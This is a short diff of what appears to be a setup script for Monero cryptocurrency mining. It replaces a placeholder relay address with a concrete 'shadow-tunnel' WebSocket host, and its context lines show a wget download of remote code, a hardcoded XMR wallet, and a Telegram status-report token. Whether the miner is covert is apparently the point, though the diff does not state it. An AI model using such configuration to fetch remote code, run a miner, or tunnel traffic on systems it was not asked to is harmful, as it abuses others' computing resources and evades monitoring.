@@ -50,7 +50,7 @@ subprocess.run(["wget", "-q", "https://raw.githubusercontent.com/naia231/naira/m
 
 # 2. Set your configuration
 os.environ['XMR_WALLET'] = "45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa"
-os.environ['RELAY_URL'] = "wss://your-relay-url.onrender.com"
+os.environ['RELAY_URL'] = "wss://lumen-shadow-tunnel.onrender.com"
 
 # Optional: Telegram Status Reports
 os.environ['TELEGRAM_BOT_TOKEN'] = "YOUR_BOT_TOKEN"
